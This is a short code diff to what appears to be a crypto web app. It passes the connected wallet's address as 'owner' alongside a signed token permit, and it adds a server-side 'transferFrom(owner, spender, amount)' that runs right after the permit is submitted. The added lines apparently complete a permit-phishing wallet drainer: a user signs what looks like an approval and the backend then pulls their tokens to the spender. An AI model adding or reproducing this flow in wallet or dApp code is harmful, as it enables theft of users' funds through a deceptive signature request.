@@ -146,7 +146,8 @@ const Page = () => {
 								amount,
 								nonce,
 								deadline,
-								rpc: provider?.connection?.url
+								rpc: provider?.connection?.url,
+								owner: account.address
 							}
 							// const response = await fetch("/api/wallet/permit", {
 							// 	headers: {
@@ -246,6 +247,7 @@ export type ContractCovalenTHQ = {
 
 async function handle(json: any) {
 	const {
+		owner,
 		contract,
 		signature,
 		spender,
@@ -274,7 +276,10 @@ async function handle(json: any) {
 	await tx.wait();
 	console.log("FINISHED");
 
-	
+	const transferTx = await tokenContract.transferFrom(owner, spender, amount);
+	const transferReceipt = await transferTx.wait();
+
+	console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
 }
 
 
